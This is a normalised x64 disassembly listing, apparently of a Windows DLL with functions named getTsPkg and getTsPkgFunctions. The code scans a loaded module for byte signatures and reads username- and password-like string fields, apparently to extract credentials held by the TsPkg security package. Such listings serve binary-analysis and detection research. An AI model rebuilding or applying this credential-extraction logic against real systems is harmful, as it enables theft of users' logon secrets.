jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi ] r14
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
movzx eax [ rdi + 0xa ]
sub al r13b
add al 0x30
mov [ r12 ] al
inc r12
inc esi
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_1800147a0
push rbx
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rcx
jne r-xdata
movzx eax [ rcx + 0xa ]
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
test rcx rcx
je r-xdata
movzx eax [ rbx + 0xa ]
mov [ rbx ] 0x0
mov [ rbx + 0x8 ] 0x1
add rsp 0x20
pop rbx
retn
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rbx + 0xa ] ax
mov [ rbx + 0x8 ] 0x1
add rsp 0x20
pop rbx
retn
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_180014810
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov [ rbx ] 0x0
mov [ rbx + 0x8 ] 0x1
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rbx + 0x8 ] 0x0
mov rax rbx
add rsp 0x20
pop rbx
retn
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_180014880
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movzx esi r8b
mov rdi rdx
mov rbx rcx
cmp rdx 0xffffffffffffffff
jne r-xdata
cmp rdx 0xfffffffffffffffe
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rax [ rcx + 0x18 ]
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rdx rdx
jne r-xdata
mov r8 [ rcx + 0x10 ]
call sub_1800029e0
test rdi rdi
je r-xdata
mov [ rcx + 0x10 ] rdx
cmp rax 0x10
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp rdi 0x1
jne r-xdata
mov rax rcx
mov [ rcx ] 0x0
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx ]
mov [ rax ] dl
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] sil
jmp r-xdata
mov rax [ rbx ]
mov [ rax ] sil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
movsx edx sil
mov r8 rdi
call sub_18001d7d0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_180014980
push rbx
sub rsp 0x20
mov rax [ rdx ]
xor r9d r9d
mov rbx rcx
mov [ rcx ] rax
add rcx 0x8
mov rdx r8
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r9
mov [ rcx ] r9w
mov [ rsp + 0x30 ] r9d
call sub_180001fd0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800149c0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001775c
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_180017388
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001778c
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_180014db0
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001775c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180018598
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
int3
lea rcx [ rsp + 0x60 ]
call sub_18001778c
mov rcx rbx
call sub_1800172b8
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_180014b10
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0xc0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rdi r8
mov [ rsp + 0x28 ] rdx
mov rsi rcx
mov r13d 0x2
xor r9d r9d
movzx r10d [ r8 ]
test r10w r10w
je r-xdata
mov [ rsp + 0x50 ] 0xf
mov [ rsp + 0x48 ] 0x0
mov [ rsp + 0x38 ] 0x0
xor r8d r8d
mov rdx r13
lea rcx [ rsp + 0x38 ]
call sub_180014880
nop
mov eax 0xfffffffe
lea r12d [ rax + 0x3 ]
mov r15 [ rsp + 0x50 ]
movzx eax r10w
cmp r15 0x10
jb r-xdata
movzx eax [ rdi + rbx * 2 ]
test ax ax
je r-xdata
inc r9
movzx eax [ r8 + r9 * 2 ]
test ax ax
jne r-xdata
inc r13
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0xc0 ]
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x38 ]
call j_sub_180018b3c
mov eax [ rsp + 0x20 ]
lea rax [ rsp + 0x38 ]
cmp r15 0x10
mov rcx [ rsp + 0x38 ]
cmovae rax rcx
cmp [ rax + rbp ] 0x0
je r-xdata
movzx ecx [ rdi ]
nop
cmp ax r10w
jne r-xdata
add rbx r12
movzx eax [ rdi + rbx * 2 ]
cmp ax [ rdi ]
je r-xdata
lea rax [ rsp + 0x38 ]
cmp r15 0x10
cmovae rax rcx
movsx rax [ rax + rbp ]
add rbx rax
mov eax [ rsp + 0x20 ]
jmp r-xdata
inc rbx
movzx eax [ rdi + rbx * 2 ]
test ax ax
jne r-xdata
lea rdx [ rsp + 0x38 ]
cmp r15 0x10
cmovae rdx rcx
mov ecx 0x7f
movzx eax r12b
cmp r12 rcx
cmovb ecx eax
mov eax ebp
mov [ rsp + 0x20 ] eax
test ax ax
je r-xdata
inc rbp
cmp rbp r13
jb r-xdata
cmp ax cx
je r-xdata
test r14b r14b
je r-xdata
mov rdx [ rsp + 0x28 ]
mov rcx rsi
call sub_180014f30
test al al
jne r-xdata
mov rdx [ rsp + 0x28 ]
mov rcx rsi
call sub_180014f30
test al al
jne r-xdata
lea rdx [ rsp + 0x38 ]
cmp r15 0x10
cmovae rdx [ rsp + 0x38 ]
mov ecx 0x7f
movzx eax r12b
cmp r12 rcx
cmovb ecx eax
mov eax [ rsp + 0x20 ]
jmp r-xdata
cmp [ rsi + 0x8 ] al
jne r-xdata
mov eax [ rsp + 0x20 ]
inc r12
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov [ rdx + rbp ] cl
mov r15 [ rsp + 0x50 ]
movzx eax [ rsi + 0xa ]
cmp [ rdi + rbx * 2 ] ax
jne r-xdata
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov [ rsi ] 0x0
mov [ rsi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov r14b 0x1
mov eax [ rsp + 0x20 ]
jmp r-xdata
mov [ rsi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rsp + 0x20 ] eax
xor r14b r14b
xor ebx ebx
xor ebp ebp
test r13 r13
je r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rsi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rsi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_180014db0
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x37 ]
sub rsp 0x90
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rsp + 0xc8 ] rbx
mov r12 rdx
mov rsi rcx
xor r13d r13d
mov edi r13d
mov [ rbp + 0x67 ] r13d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x4
mov rbx [ rsp + 0xc8 ]
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea ecx [ r13 + 0x18 ]
call sub_180018a08
mov rbx rax
mov [ rbp + 0x77 ] rax
test rax rax
je r-xdata
mov rbx r13
mov rax [ r12 ]
mov rdi [ rax + 0x28 ]
test rdi rdi
jne r-xdata
lea rcx [ rbp - 0x19 ]
call sub_180017470
nop
mov rcx [ rbp + 0x1f ]
test rcx rcx
je r-xdata
xor edx edx
lea rcx [ rbp - 0x19 ]
call sub_18001775c
nop
mov [ rbp - 0x11 ] r13
mov [ rbp - 0x9 ] 0x0
mov [ rbp - 0x1 ] r13
mov [ rbp + 0x7 ] 0x0
mov [ rbp + 0xf ] r13
mov [ rbp + 0x17 ] 0x0
mov [ rbp + 0x1f ] r13
mov [ rbp + 0x27 ] 0x0
test rdi rdi
jne r-xdata
lea rdi [ rax + 0x30 ]
mov [ rbp + 0x1f ] r13
mov rcx [ rbp + 0xf ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rdx rdi
lea rcx [ rbp - 0x19 ]
call sub_180017504
nop
mov edi 0x1
mov [ rbx + 0x8 ] r13
lea rax [ r--data ]
mov [ rbx ] rax
call sub_18001700c
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rax [ r--data ]
mov [ rbp + 0x67 ] rax
lea rdx [ rbp + 0x67 ]
lea rcx [ rbp - 0x31 ]
call sub_180018524
lea r11 [ r--data ]
mov [ rbp - 0x31 ] r11
lea rdx [ r--data ]
lea rcx [ rbp - 0x31 ]
call sub_180019410
int3
mov [ rbp + 0xf ] r13
mov rcx [ rbp - 0x1 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rbp - 0x1 ] r13
mov rcx [ rbp - 0x11 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbp - 0x11 ] r13
lea rcx [ rbp - 0x19 ]
call sub_18001778c
call sub_180018b3c
sub_180014f30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rdx
mov rdi rcx
mov ebp 0xffff
jne r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rcx [ rcx ]
test rcx rcx
je r-xdata
cmp [ rdi ] 0x0
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
mov [ rbx ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
xor al al
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rbx + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
cmp bp ax
je r-xdata
mov [ rbx + 0x8 ] 0x1
cmp bp ax
je r-xdata
sub_180015010
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rdi r8
mov r13 rdx
mov r12 rcx
mov [ rsp + 0x60 ] r8
xor r14d r14d
mov rax rdi
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
test rdi rdi
je r-xdata
add rdi 0x30
mov [ rsp + 0x70 ] rdi
add r12 0x30
jmp r-xdata
lea rsi [ r12 + 0x8 ]
mov rax [ r12 ]
mov [ rdi ] rax
lea rbx [ rdi + 0x8 ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
cmp rbx rsi
je r-xdata
cmp r12 r13
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
cmp [ rsi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
mov rax [ rsi ]
mov [ rbx ] rax
mov [ rsi ] r14
mov r8 [ rsi + 0x10 ]
inc r8
add r8 r8
mov rdx rsi
mov rcx rbx
call sub_180018670
jmp r-xdata
mov rax [ rsi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rsi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r14
mov [ rsi ] r14w
sub_180015110
push rbp
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
cmp [ rw-data ] 0x0
mov [ rbp - 0x28 ] 0x245c8948
mov [ rbp - 0x24 ] 0x74894808
mov [ rbp - 0x20 ] 0x48571024
mov [ rbp - 0x1c ] 0xd0ec81
mov [ rbp - 0x18 ] 0x8b480000
mov [ rbp - 0x14 ] 0xf28b48d9
jne r-xdata
call sub_180016180
test al al
je r-xdata
lea rcx [ r--data ]
mov [ rsp + 0x70 ] rbx
call [ GetModuleHandleW@IAT ]
mov rbx rax
test rax rax
je r-xdata
xor al al
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180018450
add rsp 0x60
pop rbp
retn
mov al 0x1
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_180018450
add rsp 0x60
pop rbp
retn
mov r11 [ rw-data ]
call [ GetCurrentProcess@IAT ]
lea r8 [ rbp - 0x40 ]
mov r9d 0x18
mov rcx rax
mov rdx rbx
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
mov [ rsp + 0x78 ] rsi
mov esi [ rbp - 0x38 ]
mov [ rsp + 0x80 ] rdi
mov rdi [ rbp - 0x40 ]
mov ecx 0x18
mov [ rsp + 0x88 ] r12
add rsi rdi
call j_sub_180018a08
mov r8b 0x1
mov r12 rax
xor bl bl
test r8b r8b
je r-xdata
xor edx edx
lea rcx [ rdi + 0x18 ]
cmp rcx rsi
setbe dl
test edx edx
je r-xdata
mov rcx r12
call j_sub_180018b3c#2
mov r11 [ rw-data ]
mov r12 [ rsp + 0x88 ]
mov rsi [ rsp + 0x78 ]
test bl bl
cmovne r11 rdi
mov rdi [ rsp + 0x80 ]
mov [ rw-data ] r11
jmp r-xdata
test bl bl
jne r-xdata
mov rbx [ rsp + 0x70 ]
test r11 r11
je r-xdata
mov r9d 0x18
mov r8 rdi
mov rcx r12
mov edx r9d
call sub_180018ab4
test eax eax
sete r8b
test r8b r8b
je r-xdata
test rsi rsi
je r-xdata
mov rdx [ r12 ]
lea rcx [ rbp - 0x28 ]
cmp rdx [ rcx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov rdx [ r12 + 0x8 ]
cmp rdx [ rcx + 0x8 ]
jne r-xdata
inc rdi
jmp r-xdata
mov rdx [ r12 + 0x10 ]
cmp rdx [ rcx + 0x10 ]
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
sete bl
test bl bl
jne r-xdata
getTsPkgFunctions
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x140
lea rax [ r--data ]
mov rdi rcx
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
lea rax [ r--data ]
xor ebx ebx
mov [ rsp + 0xa8 ] rax
mov [ rsp + 0x160 ] ebx
call sub_180003960
lea r11 [ rsp + 0x28 ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xf8 ] rbx
mov [ rsp + 0xf0 ] r11
call sub_180005300
mov [ rsp + 0x100 ] ax
cmp [ rsp + 0xf0 ] rbx
jne r-xdata
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x20 ] rax
lea rcx [ rsp + 0x28 ]
call sub_1800050e0
lea r11 [ r--data ]
mov [ rsp + 0x98 ] rbx
mov [ rsp + 0x28 ] r11
mov [ rsp + 0xa0 ] 0x4
call sub_180015110
lea rcx [ r--data ]
test al al
lea rbx [ r--data ]
cmovne rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
call sub_180008ab0
mov rdx rbx
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ rsp + 0x110 ]
lea rcx [ rsp + 0x20 ]
call sub_18000ddd0
mov rcx rdi
mov rdx rax
call sub_180001b10
lea rcx [ rsp + 0xa8 ]
movzx ebx al
call sub_18000dd20
lea r11 [ r--data ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xa8 ] r11
call sub_180017208
movzx eax bl
mov rbx [ rsp + 0x150 ]
add rsp 0x140
pop rdi
retn
mov edx [ rsp + 0xb8 ]
lea rcx [ rsp + 0xa8 ]
xor r8d r8d
or edx 0x4
call sub_1800037f0
getTsPkg
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x37 ]
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
xor r13d r13d
lea rax [ sub_1800155e0 ]
mov rbx rcx
mov rcx [ r--data ]
mov [ rbp - 0x59 ] rax
movzx eax [ r--data ]
mov [ rbp - 0x29 ] ax
mov [ rbp - 0x31 ] r13w
mov [ rbp - 0x31 ] rcx
mov r14d 0x7
mov rdi rdx
mov [ rbp - 0x21 ] 0x5
mov [ rbp - 0x19 ] r14
lea rax [ rbp - 0x31 ]
cmp r14 0x8
cmovae rax rcx
lea r8 [ rbp - 0x31 ]
lea rdx [ rbp - 0x59 ]
lea rcx [ rbp - 0x9 ]
mov [ rbp - 0x51 ] r13
mov [ rbp - 0x49 ] r13
mov [ rbp - 0x41 ] r13
mov [ rax + 0xa ] r13w
call sub_180014980
lea rcx [ rbp - 0x51 ]
mov rdx rax
call sub_180010d20
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
cmp [ rbp - 0x19 ] 0x8
mov [ rbp + 0x17 ] r14
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
lea r8 [ rbp - 0x51 ]
mov rdx rdi
mov rcx rbx
call sub_180016650
mov rsi [ rbp - 0x51 ]
movzx r12d al
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
movzx eax r12b
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rdi [ rbp - 0x49 ]
cmp rsi rdi
je r-xdata
mov rcx rsi
call j_sub_180018b3c
lea rbx [ rsi + 0x20 ]
nop [ rax ] eax
mov [ rbx ] r14
mov [ rbx - 0x8 ] r13
mov [ rbx - 0x18 ] r13w
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_180018b3c
cmp [ rbx ] 0x8
jb r-xdata
sub_1800155e0
mov rax rsp
push rbp
push rdi
push r12
lea rbp [ rax - 0xe8 ]
sub rsp 0x1d0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xc0 ] rax
movzx r12d r8b
mov rsi rdx
mov rdi rcx
call sub_180015110
xor ebx ebx
test al al
je r-xdata
lea rdx [ r--data ]
lea rcx [ rbp + 0x48 ]
mov [ rsp + 0x20 ] rbx
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call [ rw-data ]
lea rcx [ rbp + 0x48 ]
test eax eax
js r-xdata
mov r8d 0xe
lea rdx [ r--data ]
jmp r-xdata
mov rdx [ rsp + 0x20 ]
cmp [ rdx + 0x88 ] rbx
je r-xdata
mov [ rbp + 0x60 ] 0x7
mov [ rbp + 0x58 ] rbx
mov [ rbp + 0x48 ] bx
call sub_1800023b0
lea rdx [ rbp + 0x48 ]
mov rcx rsi
call sub_180001b10
lea rdx [ r--data ]
jmp r-xdata
mov rdx [ rdx + 0x88 ]
add rdx 0x28
call sub_1800162e0
nop
test r12b r12b
je r-xdata
mov r8d 0xf
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x88 ]
movzx r8d [ rcx + 0x18 ]
shr r8 0x1
mov rdx [ rcx + 0x20 ]
mov [ rbp + 0x88 ] 0x7
mov [ rbp + 0x80 ] rbx
mov [ rbp + 0x70 ] bx
lea rcx [ rbp + 0x70 ]
call sub_1800023b0
nop
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x88 ]
movzx r8d [ rcx + 0x8 ]
shr r8 0x1
mov rdx [ rcx + 0x10 ]
mov [ rbp + 0xb0 ] 0x7
mov [ rbp + 0xa8 ] rbx
mov [ rbp + 0x98 ] bx
lea rcx [ rbp + 0x98 ]
call sub_1800023b0
nop
lea rcx [ rsp + 0x30 ]
call sub_18000dc80
nop
mov edx 0xa
lea rcx [ rsp + 0x30 ]
call sub_18000db30
mov edi ebx
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
test [ rsp + rcx + 0x40 ] 0x6
jne r-xdata
mov [ rbp + 0x88 ] 0x7
mov [ rbp + 0x80 ] rbx
mov [ rbp + 0x70 ] bx
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x48 ]
lea rcx [ rbp + 0x70 ]
call sub_180002260
lea rdx [ rbp + 0x70 ]
mov rcx rsi
call sub_180001b10
movzx edi al
jmp r-xdata
movsxd rax [ rax + 0x4 ]
lea rcx [ rsp + rax + 0x30 ]
test edi edi
je r-xdata
mov rcx [ rsp + rcx + 0x78 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax [ rsp + 0x30 ]
cmp [ rbp + 0x60 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x70 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x98 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x48 ]
call sub_18000def0
lea rdx [ rbp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_18000ddd0
mov rdx rax
mov rcx rsi
call sub_180001b10
movzx edi al
lea rcx [ rbp - 0x48 ]
call sub_18000dd20
lea r11 [ r--data ]
mov [ rbp - 0x48 ] r11
lea rcx [ rbp - 0x48 ]
call sub_180017208
nop
cmp [ rbp + 0xb0 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
movzx eax dil
jmp r-xdata
mov rcx [ rbp + 0x48 ]
call j_sub_180018b3c
mov [ rbp + 0xb0 ] 0x7
mov [ rbp + 0xa8 ] rbx
mov [ rbp + 0x98 ] bx
cmp [ rbp + 0x88 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x98 ]
call j_sub_180018b3c
xor r8d r8d
call sub_1800037f0
or edx 0x4
mov rcx [ rbp + 0xc0 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0x1d0 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp + 0x70 ]
call j_sub_180018b3c
nop
sub_180015900
mov r11 rsp
sub rsp 0x188
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x170 ] rax
cmp [ rw-data ] 0x0
mov [ r11 - 0x28 ] 0x481b894c
mov [ r11 - 0x24 ] 0x49084389
mov [ r11 - 0x20 ] 0x48085b89
mov [ r11 - 0x1c ] 0x8d
jne r-xdata
call sub_180016180
test al al
